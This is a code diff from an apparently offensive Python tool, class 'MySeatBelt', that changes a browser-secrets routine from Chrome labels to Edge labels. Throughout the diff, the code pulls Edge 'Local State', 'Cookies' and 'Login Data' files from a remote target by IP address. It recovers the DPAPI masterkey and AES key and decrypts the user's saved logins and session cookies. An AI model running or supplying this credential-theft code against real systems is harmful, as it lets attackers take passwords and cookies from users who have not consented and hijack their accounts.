@@ -385,10 +385,10 @@ class MySeatBelt:
 		# Parse chrome
 		# autres navigateurs ?
 
-		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data", 'Local State', 'ChromeLocalState', 'DOMAIN'),
-							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", 'Cookies', 'ChromeCookies', 'DOMAIN'),
-							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network", 'Cookies', 'ChromeCookies', 'DOMAIN'),
-							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", 'Login Data', 'ChromeLoginData', 'DOMAIN'),
+		user_directories = [("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data", 'Local State', 'EdgeLocalState', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", 'Cookies', 'EdgeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network", 'Cookies', 'EdgeCookies', 'DOMAIN'),
+							("Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default", 'Login Data', 'EdgeLoginData', 'DOMAIN'),
 							]
 
 
@@ -398,10 +398,10 @@ class MySeatBelt:
 			else:
 				directories_to_use = user_directories
 				myoptions = copy.deepcopy(self.options)
-				myoptions.file = None  # "chrome_enc_blob.tmp"  # BLOB to parse
+				myoptions.file = None  # "Edge_enc_blob.tmp"  # BLOB to parse
 				myoptions.key = None
 				myoptions.masterkeys = None
-				myChromeSecrets = CHROME_LOGINS(myoptions, self.logging, self.db,user.username)
+				myEdgeSecrets = CHROME_LOGINS(myoptions, self.logging, self.db,user.username)
 
 			# if len(user.masterkeys)>0:#Pas de masterkeys==pas de datas a recup
 			for info in directories_to_use:
@@ -414,22 +414,22 @@ class MySeatBelt:
 					self.logging.debug("ls returned file %s" % longname)
 					if longname not in blacklist and not is_directory:
 						try:
-							self.logging.debug(f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Chrome files : {longname}")
+							self.logging.debug(f"[{self.options.target_ip}] [+] Found {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Edge files : {longname}")
 							# Downloading Blob file
 							localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname),allow_access_error=True)
 							#myoptions = copy.deepcopy(self.options)
-							if my_blob_type == 'ChromeLocalState':
+							if my_blob_type == 'EdgeLocalState':
 								try:
-									myChromeSecrets.localstate_path=localfile
-									guid=myChromeSecrets.get_masterkey_guid_from_localstate()
+									myEdgeSecrets.localstate_path=localfile
+									guid=myEdgeSecrets.get_masterkey_guid_from_localstate()
 									if guid != None:
 										masterkey = self.get_masterkey(user=user, guid=guid, type=my_user_type)
 										if masterkey != None:
 											if masterkey['status'] == 'decrypted':
-												myChromeSecrets.masterkey = masterkey['key']
-												aesKey = myChromeSecrets.get_AES_key_from_localstate(masterkey=masterkey['key'])
+												myEdgeSecrets.masterkey = masterkey['key']
+												aesKey = myEdgeSecrets.get_AES_key_from_localstate(masterkey=masterkey['key'])
 												if aesKey != None:
-													self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Chrome AES Key {aesKey} {bcolors.ENDC}")
+													self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Edge AES Key {aesKey} {bcolors.ENDC}")
 												else:
 													self.logging.debug(
 														f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting AES Key for Edge Local State with Masterkey{bcolors.ENDC}")
@@ -446,33 +446,33 @@ class MySeatBelt:
 									self.logging.debug(
 										f"[{self.options.target_ip}] {bcolors.WARNING}Exception in EdgeLocalState{bcolors.ENDC}")
 									self.logging.debug(ex)
-							if my_blob_type == 'ChromeLoginData':
+							if my_blob_type == 'EdgeLoginData':
 								try:
-									myChromeSecrets.logindata_path=localfile
+									myEdgeSecrets.logindata_path=localfile
 									user.files[longname] = {}
 									user.files[longname]['type'] = my_blob_type
 									user.files[longname]['status'] = 'encrypted'
 									user.files[longname]['path'] = localfile
-									logins=myChromeSecrets.decrypt_chrome_LoginData()
+									logins=myEdgeSecrets.decrypt_chrome_LoginData()
 									user.files[longname]['secret'] = logins
 									if logins is not None:
 										user.files[longname]['status'] = 'decrypted'
 								except Exception as ex:
-										self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting logindata for CHROME {user.username} {localfile} {bcolors.ENDC}")
+										self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting logindata for Edge {user.username} {localfile} {bcolors.ENDC}")
 										self.logging.debug(ex)
-							if my_blob_type == 'ChromeCookies':
+							if my_blob_type == 'EdgeCookies':
 								try:
-									myChromeSecrets.cookie_path=localfile
+									myEdgeSecrets.cookie_path=localfile
 									user.files[longname] = {}
 									user.files[longname]['type'] = my_blob_type
 									user.files[longname]['status'] = 'encrypted'
 									user.files[longname]['path'] = localfile
-									cookies=myChromeSecrets.decrypt_chrome_CookieData()
+									cookies=myEdgeSecrets.decrypt_chrome_CookieData()
 									user.files[longname]['secret'] = cookies
 									if cookies is not None:
 										user.files[longname]['status'] = 'decrypted'
 								except Exception as ex:
-										self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting CookieData for CHROME {user.username} {localfile} {bcolors.ENDC}")
+										self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting CookieData for Edge {user.username} {localfile} {bcolors.ENDC}")
 										self.logging.debug(ex)
 
 						except Exception as ex:
